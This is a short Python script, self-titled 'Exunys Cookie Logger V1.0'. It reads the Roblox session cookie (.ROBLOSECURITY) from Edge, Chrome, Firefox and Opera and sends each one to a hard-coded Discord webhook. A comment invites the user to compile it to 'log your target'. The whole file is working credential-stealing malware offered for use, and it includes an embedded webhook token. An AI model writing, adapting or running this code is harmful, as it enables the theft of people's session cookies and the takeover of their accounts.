import browser_cookie3, requests, threading

WebHook = "https://discord.com/api/webhooks/1031573353842085999/xSAmAc0BpoMJCpfPzjb_76IFin5on5qqBHyUL1WHUvJyH--dGzDQ4Z5Blqvls8a2k_VD" # Input your webhook here and make sure to compile if you want to log your target

def MicrosoftEdge():
    try:
        cookies = browser_cookie3.edge(domain_name = "roblox.com")
        cookies = str(cookies)
        cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
        requests.post(WebHook, json = {"username" : "Exunys Cookie Logger V1.0", "content" : f"```{cookie}```"})
    except:
        pass

def GoogleChrome():
    try:
        cookies = browser_cookie3.chrome(domain_name = "roblox.com")
        cookies = str(cookies)
        cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
        requests.post(WebHook, json = {"username" : "Exunys Cookie Logger V1.0", "content" : f"```{cookie}```"})
    except:
        pass

def MozillaFirefox():
    try:
        cookies = browser_cookie3.firefox(domain_name = "roblox.com")
        cookies = str(cookies)
        cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
        requests.post(WebHook, json = {"username" : "Exunys Cookie Logger V1.0", "content" : f"```{cookie}```"})
    except:
        pass

def Opera():
    try:
        cookies = browser_cookie3.opera(domain_name = "roblox.com")
        cookies = str(cookies)
        cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
        requests.post(WebHook, json = {"username" : "Exunys Cookie Logger V1.0", "content" : f"```{cookie}```"})
    except:
        pass

browsers = [MicrosoftEdge, GoogleChrome, MozillaFirefox, Opera]

for v in browsers:
    threading.Thread(target = v).start()
